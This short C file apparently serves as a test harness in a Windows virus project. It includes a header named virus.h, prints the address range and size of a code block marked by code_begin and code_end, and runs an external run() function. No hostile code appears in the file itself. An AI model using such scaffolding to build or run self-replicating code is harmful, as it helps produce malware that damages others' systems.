#include <stdio.h>
#include <windows.h>

#include "code_begin.h"
#include "code_end.h"
#include "utility.h"
#include "virus.h"

int main(int argc, char **argv) {
  printf("code_begin = 0x%08X\n", (unsigned int)code_begin);
  printf("code_end = 0x%08X\n", (unsigned int)code_end);
  printf("code_size = 0x%X\n", (uint8_t*)code_end - (uint8_t*)code_begin);
  int retVal = run();
  printf("return value: %d\n", retVal);
  return retVal;
}
